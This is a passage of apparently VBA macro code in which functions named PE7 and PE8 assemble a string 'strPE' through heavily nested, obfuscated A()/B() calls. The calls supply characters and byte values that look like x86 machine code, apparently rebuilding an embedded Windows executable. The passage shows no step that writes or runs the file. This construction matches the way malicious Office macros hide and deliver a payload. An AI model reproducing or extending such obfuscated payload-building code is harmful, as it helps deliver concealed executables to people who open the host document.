    strPE = A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "@R"), 131), 193), "@Q"), 255), 27), 139), 21), 200), 192), "@"), 0), "h4"), 235), "@"), 0), 2), 194), "@i"), 255), 214), 161), "*"), 192), "@"), 168), 198), 196), "@"), 131), 192), "@h"), 244), 234), "_"), 0), "P"), 255), 214), 131), "Q"), 8), "j"), 22), 255)
    strPE = A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(strPE, 0), "p"), 193), "@"), 0), "Y"), 144), 144), 144), 144), "U"), 139), 236), "Q"), 161), "L@A"), 0), "S"), 139), "]"), 8), "VW"), 239), 169), 232), 218), 18), 0), 0), 163), "@"), 227), 204), 0), 139), 251), 131), 201), 255), "3"), 192), 157), 174), "l54"), 193)
    strPE = A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(strPE, "@"), 0), 247), 209), "I"), 194), "9"), 7), 15), 134), 215), 0), 220), 0), "j h5"), 237), "["), 0), "S"), 255), 214), 219), 196), "b"), 133), 192), 15), "a"), 194), 0), 0), 0), 131), 195), 7), "\/L"), 255), "~|"), 193), "@"), 187), "/"), 196), 148)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(strPE, 137), "x"), 8), 133), 251), 15), 132), "R"), 1), 254), 0), 139), 222), 161), "L@A"), 0), "+"), 190), "<"), 136), 1), "RP"), 232), "w"), 4), "s"), 0), 139), "1"), 31), 243), 139), 209), 254), "K"), 193), 233), 2), 243), 165), 139), 202), 131), 225), 3), 243), 164)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(strPE, 139), 154), 8), 139), 200), "+"), 203), 198), 4), "1"), 0), 139), 21), "L"), 178), "A"), 0), "RP"), 141), "E"), 252), 151), 21), 155), "A"), 219), "Ph"), 0), 24), "V"), 0), 232), 14), "("), 0), 0), 133), 202), 15), 133), 253), 150), 237), 189), 161), 0), 24), "A")
    strPE = A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 0), 133), 205), 15), 149), 220), 0), 0), 180), 139), "E"), 252), 133), 192), 15), 133), 229), 0), 0), 0), 139), 31), "L@A"), 0), "VQ"), 232), 17), 18), 247), 0), 163), 228), 23), "A"), 0), 168), 6), 0), 128), ";[uk"), 139), 21), 0), 24)
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(strPE, "A"), 0), 215), "L"), 231), "A"), 0), "Rh"), 208), 242), 254), 0), "P"), 232), "m"), 247), 0), 0), 131), 196), 219), 163), 156), 164), "A"), 0), 135), "V"), 200), 251), 131), 201), 255), "3"), 192), 242), 174), 247), 209), "I"), 131), 249), 8), 133), 134), "O"), 255), 255), 255)
    strPE = B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(strPE, "j"), 8), "h"), 196), 242), "@"), 0), "S"), 255), 214), 214), 196), 12), 133), 192), "b"), 133), 23), 221), 255), 255), 139), 13), 200), 192), "@"), 0), "h"), 156), "v@"), 0), 131), 193), "@Q"), 255), 21), "/"), 193), "@"), 0), 131), 196), 8), "j"), 1), 255), 21), "p")
    strPE = B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 193), "@"), 0), 139), 13), 0), 24), 181), 0), 14), "w"), 156), 11), "A"), 0), "f"), 161), 244), 23), "A"), 0), "f"), 227), 192), "u"), 28), "f"), 199), 5), 244), 23), "A"), 0), "X"), 0), "_^"), 199), 5), 172), 25), "A"), 0), 212), 2), "A"), 0), "3"), 192), "[")
    strPE = B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(strPE, 194), 158), "]"), 195), 238), "="), 165), 218), "t"), 231), "y"), 210), "f"), 139), 208), "]L@A"), 0), "Rh"), 152), 201), "@"), 0), 228), 232), 202), 14), 0), 0), 131), 196), 12), 163), 172), 11), "A"), 0), "3"), 192), 144), 154), "["), 139), 229), "]"), 161), "6")
    strPE = B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(strPE, "2"), 184), 1), 0), "J8["), 139), 229), "E"), 195), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 207), 144), "U"), 134), 236), 129), 236), 216), 0), 155), 198), 161), 128), "@G"), 0), "VW"), 139), "}"), 8), "P"), 248), 255), 15), 0), 0), "j")
    strPE = B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(strPE, 1), 141), "M3WQ"), 232), "(L"), 0), 0), 139), 240), 133), 246), "t-pU"), 136), 29), "xR"), 150), 232), "y?~"), 0), "P"), 161), 200), 192), "@"), 0), "W"), 131), 192), "@h`"), 243), "@"), 168), "P"), 255), 21), 128), 193), "@")
    strPE = B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(strPE, 191), 131), 196), 210), 139), 198), 147), "A"), 139), 220), "]"), 195), 139), "M"), 8), 141), 149), "("), 255), 255), 255), "Qhp"), 246), 162), 160), "R"), 232), "YY"), 0), 0), 139), "'"), 133), 246), "x."), 194), "E"), 136), "j>PV"), 232), "1?*")
    strPE = B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(strPE, 253), 139), 13), 200), 192), 22), 0), "NV"), 131), 142), "@"), 235), "4"), 251), "@"), 0), "Q"), 255), 21), 128), 193), "@"), 0), 131), "3"), 16), 139), 198), "_^"), 139), 8), "]"), 195), 139), 133), "P"), 255), 255), 255), "P"), 163), 205), "TA"), 0), 255), 21), "\")
    strPE = A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 193), 215), 0), 131), 196), 4), 163), 192), 207), "A"), 179), 133), 192), "u#"), 139), 21), 200), 192), "@"), 0), "&"), 8), 243), "@"), 0), 131), 194), "LR"), 255), 21), 128), 193), "@"), 0), "5"), 196), 8), 184), 12), "+"), 0), 178), "}^"), 139), "u]"), 195)
    strPE = A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(strPE, 139), 13), "p"), 2), "A"), 0), 139), "U"), 8), "jXQPR"), 232), "'"), 167), 0), 0), 195), 240), 133), 246), "t-"), 141), "E"), 136), 166), "xP5"), 232), 169), ">"), 0), 0), "^"), 13), 200), 192), "_"), 148), 131), 131), 193), "@h["), 170)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(strPE, "@"), 142), "-"), 195), 21), 128), 248), "@"), 0), 131), 186), "."), 139), 198), "_"), 200), 139), 229), "]"), 31), 139), "U"), 8), "R"), 232), 191), 181), 199), 177), "_3R^"), 139), 229), "]p"), 144), 144), 144), 222), 144), 144), 144), 21), "6"), 236), 31), 139), 237)
    strPE = A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(strPE, 8), "jh"), 229), 6), 0), 0), 0), 25), 255), "#\"), 193), "@"), 0), 139), 231), 131), 196), 133), 133), 210), "u"), 10), 184), 157), 131), 0), 0), "^]"), 194), 4), 0), "W"), 185), 26), 0), 0), 193), "3"), 192), 139), 250), 243), "K"), 245), "B"), 4), 137)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 22), "_^]"), 194), 17), 0), 144), 135), 139), 236), 139), "E"), 8), 228), "V["), 139), "=0"), 193), "@"), 0), 149), "p"), 20), 187), 20), 0), 0), 0), 139), 6), 185), "y"), 175), 16), 139), 8), "n"), 137), 14), 255), 169), 139), 6), 131), 196), 4), 133)
    strPE = A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(strPE, 192), "u"), 240), "JrxKu"), 228), 139), "U"), 8), "R"), 255), 215), 131), 196), 4), "_<[]U"), 4), 28), 144), 144), 177), 9), 144), "Y"), 144), 144), 144), 144), 144), 144), 144), "U"), 139), 137), 139), "M"), 8), 139), "E"), 12), 137), 174), 12)
    strPE = A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(strPE, "]"), 194), 8), 0), "U"), 139), 236), 139), 184), 8), 139), "@"), 12), "]"), 194), 4), 0), 144), 144), 144), 219), 139), 236), 139), "M"), 8), 139), "E"), 12), 137), "A"), 16), "]"), 194), 8), 0), 236), 139), 236), 139), "E"), 8), 139), "@"), 133), 247), 194), 4), 0), 176)
    strPE = A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(strPE, 144), 144), "U"), 139), 236), "Q"), 160), 216), 2), "A"), 0), "V"), 138), 200), 254), 192), 132), 201), 162), 216), 249), "A"), 0), 15), 133), 176), 0), 0), 0), "h"), 224), 2), "A"), 0), 232), 11), 255), 13), 255), "B"), 192), "t;"), 198), 5), 216), 2), "A"), 0), 0)
    strPE = B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "^"), 139), 229), "]"), 195), 139), 21), 224), 2), 194), "z"), 246), 146), 0), "j"), 0), "h"), 220), 2), "Ak"), 232), 214), 5), ")"), 0), 139), "?"), 236), 216), "t#"), 161), 224), 224), "A"), 0), "P"), 133), 21), 255), 255), "{"), 139), "d"), 154), 5), 224), 2), "A")
    strPE = B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 198), 29), 216), 2), "A"), 0), 207), "^"), 139), 229), "]"), 195), 139), 191), 220), 2), "A"), 0), "hg"), 243), "@"), 0), "Q"), 232), ","), 12), "*"), 0), 164), 21), 220), 2), "A"), 0), "R"), 232), 240), "Y"), 0), 0), 133), 192), "u9")
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(strPE, 161), 220), 2), 233), 0), 27), "M"), 252), "Pj"), 0), "Q"), 232), 251), "5"), 0), 0), 133), 192), "u$"), 139), "U"), 252), 161), 224), 2), "A2R"), 204), 232), 8), 255), 225), 255), "*"), 13), "G"), 156), 31), 0), 139), "w"), 224), 2), 191), 0), "QR")
    strPE = B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(strPE, 232), 21), 255), 227), 255), "3"), 192), "R"), 142), 229), "]"), 195), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 160), 238), 2), "@"), 0), 132), 192), "t("), 12), 14), 162), 216), 2), "#"), 0), "u"), 31), 161), 220), 2), "R"), 0), "P")
    strPE = B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "u"), 195), 3), 207), 136), 199), 5), 220), 2), "A"), 0), 0), 0), 0), 0), 199), 5), "&"), 2), "A"), 0), 156), "T"), 0), 0), 195), 144), 144), 144), 144), 144), 144), 144), 144), 144), 137), 163), 144), 144), 144), "U"), 139), 25), 255), 236), 12), 225), "E"), 12), "S")
    strPE = B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(strPE, "=W"), 141), "P"), 236), 131), 152), 248), "L"), 208), 242), "E"), 8), 137), "M"), 31), "s"), 29), 132), "@ "), 133), 192), 15), 162), "F"), 2), 0), 0), "j"), 12), 255), 208), "9"), 196), 4), "3"), 2), "_P["), 139), 229), "]"), 194), 8), 0), 139), "p,")
    strPE = A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(strPE, 139), "N"), 16), 139), "~"), 20), "+"), 247), ";"), 197), "w"), 16), 3), 209), "_"), 134), 212), 16), "^"), 139), 193), 177), "8"), 229), "]"), 194), 8), 26), 139), 196), 216), "="), 20), 163), "Y"), 16), "+"), 251), ";"), 215), "w"), 209), 177), "A"), 4), 139), "9"), 137), "8"), 139)
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(strPE, "%"), 139), "y"), 4), 137), "x"), 4), 233), "p"), 1), 0), 0), 199), "x"), 24), 141), 154), 23), 16), 0), 0), 129), 158), 0), 240), 160), 255), ";"), 218), 137), "+"), 12), 15), 181), 203), 1), 187), 0), 164), 251), 0), 248), 0), "|"), 34), 10), "bE"), 12), 0)
    strPE = A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(strPE, "t"), 0), 0), 238), "F"), 12), 139), 211), 193), 234), "UJ1"), 250), 144), 137), "U"), 252), 15), 135), 167), 1), 0), 217), 236), 23), 15), 135), 219), 0), 0), 0), ":G"), 12), 133), 195), "t"), 9), "P"), 232), 163), "W"), 0), 0), 218), "U"), 252), 139), 197)
    strPE = B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 151), 20), 139), 239), 252), 199), 151), 20), 133), 219), "u"), 15), ";"), 208), "S"), 238), 139), "X"), 4), "~"), 192), 4), "Bv"), 219), "t"), 172), 139), 169), 133), 219), 137), "]"), 244), "t"), 29), 139), 27), 133), 219), 134), 24), "a"), 21), ";"), 202), "r"), 17), "HP")
    strPE = A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(strPE, 252), 131), 232), 4), "I"), 134), "jo"), 4), 133), 201), "w"), 241), 137), 15), 139), "]"), 179), 139), "G"), 8), 139), "K"), 8), "n"), 193), 191), "G"), 8), 139), 200), 213), "="), 4), ";"), 200), "v"), 3), 137), "G"), 8), 139), 156), "*"), 133), 255), "t"), 6), "W"), 232)
    strPE = B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 166), 248), 0), 0), "w"), 233), 24), 137), 212), "N"), 233), 154), 0), 0), 0), 139), "G"), 20), 133), 192), 171), "9"), 139), "G"), 12), 133), 192), "t"), 6), "P"), 232), 23), "WF"), 0), 139), "_"), 20), 141), "G"), 20), 133), 219), "t"), 224), 139), "M"), 252), 139), "S")
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(strPE, 8), ";*vF"), 216), 195), 139), 27), 7), 219), "u"), 238), 139), 127), 12), 133), 255), "t"), 6), "W"), 232), "^W"), 0), 223), 185), 204), "tS"), 255), 1), "\"), 193), "@"), 0), 131), 196), 4), 133), 192), 15), 132), 197), 0), 0), 0), 139), "U"), 252)
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(strPE, 141), 178), 24), 137), "P"), 8), 141), 20), 24), 137), "H"), 16), 224), 198), 0), 0), 0), 0), 137), "W"), 20), 139), 200), 235), "4"), 139), 19), 137), 139), "fC"), 8), ">"), 207), 8), 3), 200), "'Gz;"), 200), 137), 162), 8), "v"), 3), 137), 135), 8)
    strPE = B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(strPE, 139), 127), 12), 133), 255), "t"), 6), 130), 232), 7), "W"), 0), 0), 141), "K"), 24), 137), "K"), 16), 199), 3), 159), 0), ">N"), 139), 203), 139), "U"), 248), 139), "A"), 16), 199), "A"), 238), 0), 245), 0), "u"), 3), 208), 137), "Q"), 16), 139), "V="), 137), "Q")
    strPE = A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(strPE, 155), 137), 10), 139), "U"), 8), 137), "1"), 137), "N("), 137), 131), ","), 139), "N"), 152), 136), "~"), 16), 160), 207), 170), "Ye"), 193), 0), 16), 0), 0), 139), 215), 129), 225), 221), "];"), 255), "I"), 193), "&"), 12), 206), "Ne"), 139), "Z"), 12), 164), 203)

    PE7 = strPE
End Function

Private Function PE8() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(strPE, "s!"), 139), 18), ";J"), 12), "r"), 249), 139), "N"), 4), 137), 210), 139), 14), 139), "~"), 4), 137), "M"), 4), 139), "J"), 4), "UN"), 4), 224), "A"), 137), 22), 137), 132), 153), ">^["), 139), 229), "]"), 194), 8), 0), 139), "E"), 8), 139), 137), " ")
    strPE = A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(strPE, 133), 192), "t]j"), 12), 255), 208), 131), 196), 4), "_^3"), 192), "["), 139), 229), 9), 194), 8), 24), "p"), 143), 144), "k"), 144), "N"), 144), 144), 12), 139), 153), 131), "\"), 12), "SYW"), 139), "}o"), 141), "w8V"), 232), 251), 246), 0)
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(strPE, 0), 139), 204), 4), "3"), 219), "*"), 196), 4), ";"), 195), 137), 30), 137), "_<t"), 13), "P"), 232), 244), 0), "Z"), 0), 139), "G"), 4), ";"), 195), "h"), 196), 141), "w"), 16), "V"), 232), 212), 9), 0), "O"), 139), 249), 176), 132), 30), "PG"), 147), 20), 232)
    strPE = B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(strPE, 6), 10), 0), 0), 139), "G0-"), 26), "^"), 137), "_"), 28), 137), "_$"), 137), 192), ","), 137), "H"), 16), 139), 154), 131), 196), 8), ";"), 200), 206), 161), 244), 15), 179), 24), 0), ">"), 0), 139), "P"), 4), 137), 26), 139), 127), 197), 139), "0"), 139), "G")
    strPE = B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(strPE, 12), 133), 192), "t"), 6), "P"), 232), "/U"), 0), 0), 139), 7), 139), "O"), 4), 139), "WK"), 0), 19), 8), 137), "M"), 167), 139), 6), 139), "M"), 252), 137), 13), 248), 139), "F"), 8), 133), 201), "t"), 10), ";"), 243), 142), 6), 137), 30), 139), 222), 235), "/")
    strPE = A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(strPE, "s"), 248), 20), "s"), 24), 30), "L)"), 20), 177), 201), 137), 14), "u"), 8), ";E"), 8), 153), 3), 137), "E"), 8), 137), "tV"), 20), 209), 11), 139), "O"), 243), 137), 14), 137), "w"), 20), 150), 208), "r"), 4), 196), 208), 235), 2), 242), 210), 139), "u"), 248)
    strPE = A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(strPE, 133), 246), "u"), 177), 139), "E"), 8), 137), "W"), 247), 137), 7), 139), 127), 12), 133), 255), "t"), 161), 3), 232), "kU"), 0), 0), 133), 219), "t"), 20), 139), "50"), 193), "@"), 0), 139), 195), 140), 175), "P"), 255), 214), 252), 196), 232), "F"), 219), "u"), 242), 139)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(strPE, "E"), 244), 137), "."), 137), "@"), 141), "_^"), 247), 139), 229), "]"), 221), "<"), 0), 155), 144), "U"), 139), 236), 131), 236), 12), 253), 139), "]"), 8), "VW"), 141), 152), "8V"), 232), 186), 25), 0), 0), 139), "C"), 4), 131), 196), 4), 133), 192), 199), 6), 0)
    strPE = B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(strPE, 2), 187), 179), 199), "C<"), 0), 0), 0), 0), "t"), 13), "M"), 232), 206), 255), 255), 255), 139), "C"), 4), "I"), 192), 17), 243), 141), "C"), 16), ")"), 232), 174), 8), 0), 0), 139), "T"), 28), "Q"), 232), 229), 8), 0), "="), 139), 3), 131), 196), 8), 133), "i")
    strPE = B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(strPE, "t5"), 139), "P"), 24), "v; "), 250), 255), 255), 161), 5), 133), 246), 161), 6), "V"), 139), "gT"), 0), 29), 130), "C"), 12), 139), 151), 129), 137), 200), 139), "C"), 12), 131), "l"), 0), "t"), 6), 139), "S"), 8), "fB"), 12), 133), 182), "t"), 6), "V")
    strPE = A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(strPE, 232), 183), "T"), 0), 0), 139), "s0"), 139), "{"), 24), "W"), 139), "I"), 4), 199), 142), 0), 0), 0), "/"), 232), 181), 250), 231), 255), ";"), 139), 189), 4), "j"), 0), "WkV"), 250), 255), 176), 139), "G"), 12), 190), 223), "$"), 29), 254), 6), "P"), 232), 23)
    strPE = A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(strPE, "T"), 0), 0), 139), "W"), 4), 139), 15), 137), "U"), 156), 139), 251), 8), 137), "M"), 252), 139), 6), 24), "t"), 248), 137), "E"), 244), 139), "F"), 8), 22), "e"), 135), 10), ";"), 194), "v"), 6), 137), "|"), 139), 222), 235), "l"), 131), 248), 20), "s"), 24), 139), 27), 135)
    strPE = B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(strPE, 20), 133), 201), 137), "Vu"), 8), ";E"), 252), "vE"), 137), "E"), 252), 137), "t"), 135), 20), 235), 8), 139), "O"), 20), 137), 14), 137), "w"), 20), ";"), 208), "r"), 4), "+"), 208), 235), 2), "="), 210), "-uU;"), 246), 22), 177), 139), "E"), 252), " ")
    strPE = A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(strPE, ">"), 8), 202), 7), 139), "GO"), 133), 192), "t`P"), 232), 21), "T"), 29), 0), ">"), 230), "t"), 20), "350"), 193), "@"), 0), "]"), 194), "~:P"), 24), 214), 131), 196), "]$"), 219), "u"), 242), "w"), 28), 231), 2), 255), 255), ";E"), 8)
    strPE = A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(strPE, "u"), 6), "W"), 232), "N"), 249), 255), "L_^[9"), 229), "]"), 1), "|"), 0), 144), 236), 144), "b"), 139), 236), 139), "E"), 8), 164), 0), 221), 0), "+5"), 139), "E"), 12), 203), 192), "u"), 11), 139), 13), 220), 2), "R"), 0), 137), "M"), 150), 139), 148)
    strPE = A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(strPE, 139), 202), 16), 133), 201), "u"), 10), 133), 192), "t"), 6), 210), "P -"), 217), 16), "SB"), 236), 20), "VW"), 133), 219), "u"), 3), 139), "X"), 24), 139), 3), 191), 1), 244), 0), 0), ";"), 199), "r"), 205), "hC"), 12), 133), 192), "t"), 6), "P"), 232)
    strPE = A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(strPE, 237), "Ss"), 0), 139), "s"), 24), 139), 11), 141), 164), 24), 139), "{"), 133), 246), "u"), 247), ";"), 209), 223), 11), 147), "pJ"), 131), 181), 4), "B"), 210), 246), "t"), 241), 139), "0"), 133), 246), 23), 240), 139), ">"), 133), 255), 137), "8"), 15), 138), "r"), 0), 0)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(strPE, 0), ";"), 209), "F"), 130), 130), 0), 0), 186), 139), "P"), 194), 131), 232), 4), "I"), 133), 210), "u"), 4), 133), 201), "w"), 241), 137), 11), 235), 193), 139), "C"), 182), 141), "s"), 20), 133), 192), "!"), 228), 12), 196), 12), 133), 192), "t"), 6), 162), 232), 187), 247), 0)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(strPE, 0), 139), 198), 139), "0"), 133), "\t)"), 202), "~"), 211), "sG"), 139), 184), 27), "y"), 184), 246), "u"), 243), 144), ";"), 12), 133), 192), 134), 6), "P"), 232), 9), "S"), 252), 0), "h"), 0), " "), 0), 234), 255), 21), 8), 193), "@"), 0), 139), 240), 131), 196)
    strPE = A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(strPE, 201), 198), "h"), 15), 132), "e"), 0), 0), 0), 141), "V"), 8), 141), 134), 139), " "), 10), 0), 199), 6), 200), 0), 0), 0), "z~"), 8), 137), "V"), 16), 137), "F"), 20), 235), "4"), 139), 22), 137), 16), "H{"), 8), 187), "F"), 8), 168), 248), 139), "C"), 4)
